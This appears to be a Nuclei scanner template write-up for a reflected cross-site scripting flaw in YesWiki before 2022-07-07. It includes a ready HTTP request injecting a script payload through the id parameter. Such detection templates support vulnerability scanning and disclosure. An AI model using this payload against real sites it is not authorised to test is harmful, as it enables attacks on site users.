# Nuclei Template: YesWiki <2022-07-07 - Cross-Site Scripting
**Template ID:** yeswiki-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`yeswiki-xss.yaml`)

## Vulnerability Information & PoC

## Description
YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## References
- https://huntr.dev/bounties/de4db96c-2717-4c0e-b7aa-eee756ca19d3/
